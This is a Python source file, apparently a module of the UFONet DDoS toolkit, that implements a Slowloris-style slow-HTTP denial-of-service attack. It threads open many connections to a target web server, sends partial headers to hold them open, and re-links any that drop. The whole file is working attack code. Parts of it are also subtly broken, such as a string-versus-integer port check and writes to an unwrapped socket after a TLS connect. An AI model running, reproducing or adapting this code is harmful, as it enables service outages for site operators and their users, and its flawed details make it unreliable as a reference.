#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - (DDoS botnet + DoS tool) via Web Abuse - 2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import time, sys, threading, socket, random, ssl

# UFONet Slow HTTP requests (UFOLoris)
def setupSocket(self, ip, port, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(6)
    if port == "443":
        ss = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
        ss.connect((ip, port))
    else:
        sock.connect((ip, port))
    if method == "GET":
        sock.send("GET / \r\n".encode("utf-8"))
    else:
        sock.send("POST / \r\n".encode("utf-8"))
    return sock

def tractor(self, ip, port, requests): 
    for i in range(requests): 
        try:
            method = 'GET'
            sock = setupSocket(self, ip, port, method)
            print "[Info] Firing 'tractor' beam from: LORIS -> Status: CONNECTED! -> 'Keeping socket open in time...'"
        except socket.error:
            break
        self.sockets.append(sock)
    while True: # try to abuse HTTP Headers
        for sock in list(self.sockets):
            try: 
                # "Verb Tunneling Abuse" -> [RFC2616]
                method = 'POST' 
                sock.send("X-HTTP-Method: {}\r\n".format('PUT').encode("utf-8"))
            except socket.error:
                self.sockets.remove(sock)
        for i in range(requests - len(self.sockets)):
            print("[Info] Re-opening closed LORIS 'tractor' beam -> Status: RE-LINKED!")
            try:
                method = 'GET'
                sock = setupSocket(self, ip, port, method)
                if sock:
                    self.sockets.append(sock)
            except socket.error:
                break
        time.sleep(10)

class LORIS(object):
    def __init__(self):
        self.sockets = []

    def attacking(self, target, requests):
        print "\n[Info] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]\n"
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        ip = socket.gethostbyname(target)
        t = threading.Thread(target=tractor, args=(self, ip, port, requests)) # attack with UFOLoris using threading
        t.daemon = True
        t.start()
        time.sleep(10)
